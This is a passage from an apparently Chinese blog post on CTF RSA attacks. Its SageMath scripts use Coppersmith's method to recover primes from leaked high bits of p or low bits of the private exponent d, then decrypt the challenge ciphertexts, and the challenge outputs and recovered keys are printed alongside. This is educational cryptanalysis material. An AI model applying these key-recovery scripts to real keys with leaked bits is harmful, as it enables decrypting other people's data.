pbar</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 0x73cec712124b33c0294e01eb52e8c3cd2fe9ddbcbf457b3b950360063dfae42cbbe9855bd986bcfea0948fadfb252f5e2ff3c982ff47afb6596a496636f1fc5ecfe9f5db7620b23fe9e30d230aa9299ab9a78bfb5e0630fd1149259b2b2104ea65d2e27b89785e4bf01d0594d9f94575cbcc3383f63c5aabe4d5b48eb761cce3ab21689b3f3155b5f15efee240d5ac11cee2acbd019de7c06f607ea618b5cd735b5a6972d2b446a12ff58cf8314822fa5ea09d0963acd00441b2a1b37aca01d7f39052927db98a0bd5ca1c49a7ad67923e3aac30ecd33cc8b4b30a40cdb3acc721ee5da53a02977cee959affe672a668525eb78df96af0a14f4ac04fab68efa8eabe9535e1064a5fc2ff7cac9520210311db0c3bf91101bc55a67a81e4f69364c724ee6ad6bdc301df642c9392e9befa4ff0d65481adb6feac251cd207044587da9710809700246cb3c63e659a97249f5e7418568e37db2fb2c1115e719d6682bb2e89b4e23d40ba4c532f289e10e0b89a5647c486a09b9e376844171b229d74f871004d4945a702a391a04ac704f43809e972891e6ab33b3c0f03f0b6f9ae005b26be6e647a1865c727277423f59a595187ffbfea13501e23b6b57ef115eaa6febcb207a3112628652a39578847241c33989e84607b0f683b30ddf773348b07360b063d9120a397809591ca18a04cd32ad9cbfe0494ed3ae8d2c5b43fdb51cb</span><br><span class="line">p_fake &#x3D; 25469341510015610710601677541490068882874022771473379147959682877979811860690835905177575433486769235926750944378553837429714908846121392087707617153368450157831411033840331452402635316893579428297241392591768100008774205252294780519995317089863801331600746389471563346749402400584048767782402832414560955794979239140648096754408560344380360521300295416056532504527346890878830708030202503589314586128121926254376071861981570648841288044240102936057199541504839050994656267226010545841307490110261343492485615893311098351703701000220286503350522201318815497988460167971677642567134161349144833221240627311534482202273</span><br><span class="line">pbits &#x3D; p_fake.nbits()</span><br><span class="line">kbits &#x3D; 900</span><br><span class="line">#kbits &#x3D; 200</span><br><span class="line">pbar &#x3D; p_fake &amp; (2^pbits-2^kbits)</span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.3</span><br><span class="line">p&#x3D; x0 + pbar</span><br><span class="line">print &#39;p &#x3D;&#39;,p</span><br></pre></td></tr></table></figure>







<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge 2\n&#39; &#39;[+]n&#x3D;0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7dL\n&#39;  &#39;[+]e&#x3D;65537\n&#39; &#39;[+]m&#x3D;random.getrandbits(512)\n&#39;     &#39;[+]c&#x3D;pow(m,e,n)&#x3D;0x284a601c3321fd882d3b64ae27fb587d1714bc18aecc3293169861bcf17678a6e83947aba4f165f22a712ed42e43c66cf70eb1df4d73dd3adf1754f627b1b3ca25b76b3a595369c36b1f5635cd3efe5924539757e74840224eec238534ead0bcbdce26eb018aa33516d22790240c7576cb5a09d3f69bcf2795a3a353db7c8bedL\n&#39;     &#39;[+]((p&gt;&gt;128)&lt;&lt;128)&#x3D;0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000L</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blus.King」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;q851579181q&#x2F;article&#x2F;details&#x2F;90645041</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;0x284a601c3321fd882d3b64ae27fb587d1714bc18aecc3293169861bcf17678a6e83947aba4f165f22a712ed42e43c66cf70eb1df4d73dd3adf1754f627b1b3ca25b76b3a595369c36b1f5635cd3efe5924539757e74840224eec238534ead0bcbdce26eb018aa33516d22790240c7576cb5a09d3f69bcf2795a3a353db7c8bedL</span><br><span class="line">n &#x3D; 0x5894f869d1aecee379e2cb60ff7314d18dbd383e0c9f32e7f7b4dc8bd47535d4f3512ce6a23b0251049346fede745d116ba8d27bcc4d7c18cfbd86c7d065841788fcd600d5b3ac5f6bb1e111f265994e550369ddd86e20f615606bf21169636d153b6dfee4472b5a3cb111d0779d02d9861cc724d389eb2c07a71a7b3941da7d</span><br><span class="line">p_fake &#x3D; 0x5d33504b4e3bd2ffb628b5c447c4a7152a9f37dc4bcc8f376f64000fa96eb97c0af445e3b2c03926a4aa4542918c601000000000000000000000000000000000</span><br><span class="line">pbits &#x3D; p_fake.nbits()</span><br><span class="line">kbits &#x3D; 128</span><br><span class="line">#kbits &#x3D; 200</span><br><span class="line">pbar &#x3D; p_fake &amp; (2^pbits-2^kbits)</span><br><span class="line">print &quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + pbar</span><br><span class="line">x0 &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.3</span><br><span class="line">p&#x3D; x0 + pbar</span><br><span class="line">print &#39;p &#x3D;&#39;,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p&#x3D;4881303325607587234201385254050033835312172878514703272072771615943902178092736544523304388539705532310101139649392707401107616606921391984907633619668131</span><br></pre></td></tr></table></figure>

<h6 id="其他exp-https-www-jianshu-com-p-1a0e876d5929-加以理解Coppersmith"><a href="#其他exp-https-www-jianshu-com-p-1a0e876d5929-加以理解Coppersmith" class="headerlink" title="其他exp:https://www.jianshu.com/p/1a0e876d5929  加以理解Coppersmith"></a>其他exp:<a href="https://www.jianshu.com/p/1a0e876d5929" target="_blank" rel="noopener">https://www.jianshu.com/p/1a0e876d5929</a>  <code>加以理解Coppersmith</code></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">import binascii</span><br><span class="line">n &#x3D; 0x.... # 此处为16进制数</span><br><span class="line">p4 &#x3D;0x....  #p的高位 16进制</span><br><span class="line">cipher &#x3D; 0x 密文</span><br><span class="line">e2 &#x3D; 0xf93b</span><br><span class="line">pbits &#x3D; 1024</span><br><span class="line">kbits &#x3D; pbits - p4.nbits()</span><br><span class="line">print p4.nbits()</span><br><span class="line">p4 &#x3D; p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">f &#x3D; x + p4</span><br><span class="line">roots &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)</span><br><span class="line">if roots:</span><br><span class="line">   p &#x3D; p4+int(roots[0])</span><br><span class="line">   print &quot;p: &quot;, hex(int(p))</span><br><span class="line">   assert n % p &#x3D;&#x3D; 0</span><br><span class="line">   q &#x3D; n&#x2F;int(p)</span><br><span class="line">   print &quot;q: &quot;, hex(int(q))</span><br><span class="line">   print gcd(p,q)</span><br><span class="line">   phin &#x3D; (p-1)*(q-1)</span><br><span class="line">   print gcd(e2,phin)</span><br><span class="line">   d &#x3D; inverse_mod(e2,phin)</span><br><span class="line">   flag &#x3D; pow(cipher,d,n)</span><br><span class="line">   flag &#x3D; hex(int(flag))[2:-1]</span><br><span class="line">   print binascii.unhexlify(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">import binascii</span><br><span class="line">n &#x3D; 0x9d3a1a28ecb1bd245dd86b18dc4c5b729f23778710005118836129f08e31d6516de8ab47db1b3b7f660f50d283b1e9f2c06e7836136e4c0159f5d2b05771861d3ce6aa8715932eadc1cc0f380909a1961018340f7393142f9c177b1187151f97ac8cdc4ad17fa59a0f39d192af555f27de9cc800846eb2ca6ce78f87c0c0fbf47828328392b81771af624389fd779d130d80739bb7a608961125ba3f1800c766440fa70bfd3f834294d47d7ed9cfffd6d14ae18310f6c1d6d8f88b6c5d72a0b45608b4e21bbb8e314220ed7a2d6a8c95454e571c71b50f1d6a823778ca47131f5b889a1ed1957248bee8c4ac66872a5fd58a121560a27bad4958f1c763f2ffddL</span><br><span class="line"></span><br><span class="line">#p4 &#x3D;0xda5df16f286dbc825cd0c8ee48aa26ac27338a75172c5b92351f14d083216f7e91b9355e27cf930646fbbda6058dec3c4ddf751f36df5556359fbe671f9b947b4c79cadfdbb27b00</span><br><span class="line"></span><br><span class="line">cipher &#x3D; 0x1f2deea59244b14e53c72465febc2064172a35245842fa83ebff313344bed35ee8af8c3f8f61e6f498fa1fd35e63998a573d7717905f72ec01de0b0529eaab10eb0b0c2ca06e9d6e4245e748fd74f4f756a86e379559793389a3ae6c421d51bb78331a487fc3c3e68971e3e26991ab34ce2a2c07ffd5a5a1e215e766b51fb2d6aab63c2dafa3c87d0a5eb79b634740e1fca7a727de997958839bda684e19acad93cae4abfd1c8cc3684419f83696fe4840f3253e7c038adb13a1382667cf7e17ef55c1e950ea474594102e660e36a23bfd3fd830d1c18a434d0b34bed98308399a894dcab909d68bcab7c7ac990974a4f6ed7d612abb7044f6734eaaebcdc0b5L</span><br><span class="line"></span><br><span class="line">e2 &#x3D; 0x10001</span><br><span class="line">pbits &#x3D; 1024</span><br><span class="line"></span><br><span class="line">for i in range(0,127):</span><br><span class="line">    p4&#x3D;0xda5df16f286dbc825cd0c8ee48aa26ac27338a75172c5b92351f14d083216f7e91b9355e27cf930646fbbda6058dec3c4ddf751f36df5556359fbe671f9b947b4c79cadfdbb27b00</span><br><span class="line">    p4&#x3D;p4+int(hex(i),16)</span><br><span class="line">    print hex(p4)</span><br><span class="line">    kbits &#x3D; pbits - p4.nbits()</span><br><span class="line">    print p4.nbits()</span><br><span class="line">    p4 &#x3D; p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    f &#x3D; x + p4</span><br><span class="line">    roots &#x3D; f.small_roots(X&#x3D;2^kbits, beta&#x3D;0.4)</span><br><span class="line">    #rint roots</span><br><span class="line">    if roots:</span><br><span class="line">        p &#x3D; p4+int(roots[0])</span><br><span class="line">        print &quot;p: &quot;, hex(int(p))</span><br><span class="line">        assert n % p &#x3D;&#x3D; 0</span><br><span class="line">        q &#x3D; n&#x2F;int(p)</span><br><span class="line">        print &quot;q: &quot;, hex(int(q))</span><br><span class="line">        print gcd(p,q)</span><br><span class="line">        phin &#x3D; (p-1)*(q-1)</span><br><span class="line">        print gcd(e2,phin)</span><br><span class="line">        d &#x3D; inverse_mod(e2,phin)</span><br><span class="line">        flag &#x3D; pow(cipher,d,n)</span><br><span class="line">        flag &#x3D; hex(int(flag))[2:-1]</span><br><span class="line">        print binascii.unhexlify(flag)</span><br></pre></td></tr></table></figure>





<h5 id="当秘密密钥-d-的低位已知时"><a href="#当秘密密钥-d-的低位已知时" class="headerlink" title="当秘密密钥 d 的低位已知时"></a>当秘密密钥 d 的低位已知时</h5><p> <a href="http://d.hatena.ne.jp/keyword/%C8%EB%CC%A9%B8%B0" target="_blank" rel="noopener">对于私钥</a> d，如果已知低位约为 n 位数的 1/4，则可以恢复 d 的值。有时称为部分密钥暴露攻击。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># partial_d.sage</span><br><span class="line"></span><br><span class="line">def partial_p(p0, kbits, n):</span><br><span class="line">    PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line"></span><br><span class="line">    f &#x3D; 2^kbits*x + p0</span><br><span class="line">    f &#x3D; f.monic()</span><br><span class="line">    roots &#x3D; f.small_roots(X&#x3D;2^(nbits&#x2F;&#x2F;2-kbits), beta&#x3D;0.3)  # find root &lt; 2^(nbits&#x2F;&#x2F;2-kbits) with factor &gt;&#x3D; n^0.3</span><br><span class="line">    if roots:</span><br><span class="line">        x0 &#x3D; roots[0]</span><br><span class="line">        p &#x3D; gcd(2^kbits*x0 + p0, n)</span><br><span class="line">        return ZZ(p)</span><br><span class="line"></span><br><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    X &#x3D; var(&#39;X&#39;)</span><br><span class="line"></span><br><span class="line">    for k in xrange(1, e+1):</span><br><span class="line">        results &#x3D; solve_mod([e*d0*X - k*X*(n-X+1) + k*n &#x3D;&#x3D; X], 2^kbits)</span><br><span class="line">        for x in results:</span><br><span class="line">            p0 &#x3D; ZZ(x[0])</span><br><span class="line">            p &#x3D; partial_p(p0, kbits, n)</span><br><span class="line">            if p:</span><br><span class="line">                return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    n &#x3D; 0x00bef498e6eb2cffe71312da47ab89d2c47db7438ea2cfa992ddddbc2a01978001fc51e286e6ebf028396cdb8b3323c60e6b9d50cd84187cf7f48e3875a2f0890f70b02333ad89db2923863ce146562286f63fb0a1d0198e3a6862ba5ac12e85a5c6d0d27cb1c81bdf69cc5bc95b8001a2f744517f9437b4ddd5a076fc0e9a5de1a7a268c40f31aa29e8dc27c0b3a182299ca7a9335b4bd4585452f6107c238e486c98dd73a5f9862e9e80b152f53381c72f897107551c281259ac3ee32c4b4f46cc03127d1bf699acd0266f3c6729253c70da0c69b1560fa172735709866b375b6eba294e1ce8b46fba798ba380080b4bf9603998cac199d9cd46e30ae8da9e7f</span><br><span class="line">    e &#x3D; 3</span><br><span class="line">    d &#x3D; 0x7f4dbb449cc8aa9a0cb73c2fc7b1372da924d7b46c8a710c93e9281c010faaabfd8bec59ef47f5702648925cccc284099d138b33ad65a8a54db425a3c1f5b0b4f5cac22273b13cc617aed340d98ec1af4ed5206be011097c459726e72b7459192f35e1a8768567ea46883d30e7aaabc1fa2d8baa62cfcde93915a4a809bc3e9547bb07e1ecca16e51078312e89f0561e31b55db8b0ea5bc87a6ca7464a3d7c28a68c60e2ba88fe6a7d2b300d723e549910a987da89fc0a1c0de197a3d62c501b1f0e819891b1c32a0d6c233f2a285df87bb9e5c6c72d983ff3e706696bba639f573f9c3646968f02f3a615a438e20bb7c38d53621079f2899547a95350f3abeb</span><br><span class="line"></span><br><span class="line">    beta &#x3D; 0.5</span><br><span class="line">    epsilon &#x3D; beta^2&#x2F;7</span><br><span class="line"></span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line">    kbits &#x3D; floor(nbits*(beta^2+epsilon)) </span><br><span class="line">    d0 &#x3D; d &amp; (2^kbits-1)  #d0 代表已知的 d 的较低位，kbits 是已知的 d0 的位数。</span><br><span class="line">    print &quot;lower %d bits (of %d bits) is given&quot; % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p &#x3D; find_p(d0, kbits, e, n)</span><br><span class="line">    print &quot;found p: %d&quot; % p</span><br><span class="line">    q &#x3D; n&#x2F;&#x2F;p</span><br><span class="line">    print d</span><br><span class="line">    print inverse_mod(e, (p-1)*(q-1))</span><br></pre></td></tr></table></figure>

<p>上面的代码按以下顺序恢复 d 的值：</p>
<ol>
<li>根据 e，d，n 和 p 满足较低位的方程，从 d 的较低位中查找 p 较低位的候选对象</li>
<li>从 1 中获得的候选者中搜索可以使用 Coppersmith <a href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0" target="_blank" rel="noopener">算法</a>恢复 p 值的候选者</li>
<li>根据 p 的恢复值计算另一个<a href="http://d.hatena.ne.jp/keyword/%C1%C7%BF%F4" target="_blank" rel="noopener">质数</a> q 并计算 d 的值</li>
</ol>
<p>当 p 的低位是 p0 时，图 2 <code>f(x) = 2^k * x + p0 = 0 (mod b)</code>尝试通过找到解来恢复 p 的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge 3 [DEBUG] Received 0x314 bytes: [+]n&#x3D;0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9L </span><br><span class="line">[+]e&#x3D;3 </span><br><span class="line">[+]m&#x3D;random.getrandbits(512) [+]c&#x3D;pow(m,e,n)&#x3D;0xcaeeb38516d642a19550fa863173f4695c3b44bd5a5554b1e93cfb690d5c1de531b7f1187f7d8c8c11da38af025f19d393033d0ca801e15d6d8441098485f13ab988d09ef1f4f5a735e19780c823cf77415884c33a1f7908cf4229874c082eb7ceb776bafb182b86fdabd29b07bcb8e3f2f50ee4cc0f323e8d9ce320139bcd27L </span><br><span class="line">[+]d&#x3D;invmod(e,(p-1)*(q-1)) </span><br><span class="line">[+]d&amp;((1&lt;&lt;512)-1)&#x3D;0x603d033f2ef6c759aec839f132a45215fc8a635b757f3951a731fe60bc6729b3bcf819b57abfcaba3a93e9edef766c0d499cad3f7adb306bcf1645cfb63400e3L </span><br><span class="line">[-]long_to_bytes(m).encode(&#39;hex&#39;)&#x3D;</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Blus.King」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;q851579181q&#x2F;article&#x2F;details&#x2F;90645041</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;0xcaeeb38516d642a19550fa863173f4695c3b44bd5a5554b1e93cfb690d5c1de531b7f1187f7d8c8c11da38af025f19d393033d0ca801e15d6d8441098485f13ab988d09ef1f4f5a735e19780c823cf77415884c33a1f7908cf4229874c082eb7ceb776bafb182b86fdabd29b07bcb8e3f2f50ee4cc0f323e8d9ce320139bcd27</span><br><span class="line"># partial_d.sage</span><br><span class="line"></span><br><span class="line">def partial_p(p0, kbits, n):</span><br><span class="line">    PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line"></span><br><span class="line">    f &#x3D; 2^kbits*x + p0</span><br><span class="line">    f &#x3D; f.monic()</span><br><span class="line">    roots &#x3D; f.small_roots(X&#x3D;2^(nbits&#x2F;&#x2F;2-kbits), beta&#x3D;0.3)  # find root &lt; 2^(nbits&#x2F;&#x2F;2-kbits) with factor &gt;&#x3D; n^0.3</span><br><span class="line">    if roots:</span><br><span class="line">        x0 &#x3D; roots[0]</span><br><span class="line">        p &#x3D; gcd(2^kbits*x0 + p0, n)</span><br><span class="line">        return ZZ(p)</span><br><span class="line"></span><br><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    X &#x3D; var(&#39;X&#39;)</span><br><span class="line"></span><br><span class="line">    for k in xrange(1, e+1):</span><br><span class="line">        results &#x3D; solve_mod([e*d0*X - k*X*(n-X+1) + k*n &#x3D;&#x3D; X], 2^kbits)</span><br><span class="line">        for x in results:</span><br><span class="line">            p0 &#x3D; ZZ(x[0])</span><br><span class="line">            p &#x3D; partial_p(p0, kbits, n)</span><br><span class="line">            if p:</span><br><span class="line">                return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    n&#x3D;0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9</span><br><span class="line">    e &#x3D; 3</span><br><span class="line">    d&#x3D;0x603d033f2ef6c759aec839f132a45215fc8a635b757f3951a731fe60bc6729b3bcf819b57abfcaba3a93e9edef766c0d499cad3f7adb306bcf1645cfb63400e3</span><br><span class="line"></span><br><span class="line">    beta &#x3D; 0.5</span><br><span class="line">    epsilon &#x3D; beta^2&#x2F;7</span><br><span class="line"></span><br><span class="line">    nbits &#x3D; n.nbits()</span><br><span class="line">	print &quot;nbits:%d:&quot;%(nbits)</span><br><span class="line">    #kbits &#x3D; floor(nbits*(beta^2+epsilon))</span><br><span class="line">	kbits &#x3D; nbits - d.nbits()-1</span><br><span class="line">    d0 &#x3D; d &amp; (2^kbits-1)</span><br><span class="line">    print &quot;lower %d bits (of %d bits) is given&quot; % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    p &#x3D; find_p(d0, kbits, e, n)</span><br><span class="line">    print &quot;found p: %d&quot; % p</span><br><span class="line">    q &#x3D; n&#x2F;&#x2F;p</span><br><span class="line">    print d</span><br><span class="line">    print inverse_mod(e, (p-1)*(q-1))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">p&#x3D;11225675567380871009570101516613347989321681194686379697181792843475612230559123178043068043743341164294959005139360852241393871718562719024517338855867479</span><br><span class="line">n&#x3D;0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9</span><br><span class="line">e &#x3D; 3</span><br><span class="line">q&#x3D;n&#x2F;p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d&#x3D;99430503515013903040291384133470968970466103991571343492764814780967090203742450771166104729697611017493494950675760654484422260868428264884630250537959791201255204527110189941039822089612031446149334262602063427352960800355020085981806048749599222109448518162553849621230522535730119500009520776075508187363</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">p&#x3D;11225675567380871009570101516613347989321681194686379697181792843475612230559123178043068043743341164294959005139360852241393871718562719024517338855867479</span><br><span class="line">n&#x3D;0xd463feb999c9292e25acd7f98d49a13413df2c4e74820136e739281bb394a73f2d1e6b53066932f50a73310360e5a5c622507d8662dadaef860b3266222129fd645eb74a0207af9bd79a9794f4bd21f32841ce9e1700b0b049cfadb760993fcfc7c65eca63904aa197df306cad8720b1b228484629cf967d808c13f6caef94a9</span><br><span class="line">e &#x3D; 3</span><br><span class="line">c&#x3D;0xcaeeb38516d642a19550fa863173f4695c3b44bd5a5554b1e93cfb690d5c1de531b7f1187f7d8c8c11da38af025f19d393033d0ca801e15d6d8441098485f13ab988d09ef1f4f5a735e19780c823cf77415884c33a1f7908cf4229874c082eb7ceb776bafb182b86fdabd29b07bcb8e3f2f50ee4cc0f323e8d9ce320139bcd27</span><br><span class="line">d&#x3D;99430503515013903040291384133470968970466103991571343492764814780967090203742450771166104729697611017493494950675760654484422260868428264884630250537959791201255204527110189941039822089612031446149334262602063427352960800355020085981806048749599222109448518162553849621230522535730119500009520776075508187363</span><br><span class="line">print(d)</span><br><span class="line">m &#x3D; gmpy2.powmod(c,d,n)</span><br><span class="line">print(m)</span><br><span class="line">from  libnum  import s2n,n2s</span><br><span class="line">print(n2s(m))</span><br></pre></td></tr></table></figure>













<h5 id="当知道明文-m-的高位或低位时"><a href="#当知道明文-m-的高位或低位时" class="headerlink" title="当知道明文 m 的高位或低位时"></a>当知道明文 m 的高位或低位时</h5><p>即使知道明文 m 的某些位，也可以基于相应的密文恢复 m 的值。</p>
<p>当已知明文 m 的高位约为 n 位数的（1-1 /e）时，令其余位为 0 <code>mbar</code>。当相应的密文为 c 时，<code>f(x) = (mbar + x)^e - c (mod n)</code>可以通过找到的解来获得满足此要求的 f（x）的值，即 m。这<code>b = n</code>是因为是这种情况<code>β = 1</code>。</p>
